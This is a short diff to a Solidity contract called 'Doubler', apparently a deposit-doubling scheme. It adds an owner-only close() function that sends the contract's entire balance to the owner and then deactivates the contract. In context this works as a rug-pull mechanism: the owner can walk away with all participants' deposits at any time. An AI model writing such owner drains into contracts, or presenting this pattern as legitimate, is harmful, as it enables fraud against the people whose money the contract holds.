@@ -19,9 +19,19 @@ contract Doubler {
 	uint public totalUsers = 0;
 	uint public totalWei = 0;
 	uint public totalPayout = 0;
+	bool public active;
 
 	constructor() public {
 		owner = msg.sender;
+		active = true;
+	}
+
+	function close() public{
+		require(msg.sender == owner, "Cannot call function unless owner");
+		require(active == true, "Contract must be active");
+		require(address(this).balance > 0, "This contract must have a balane above zero");
+		owner.transfer(address(this).balance);
+		active = false;
 	}
 
 	function join() external payable{
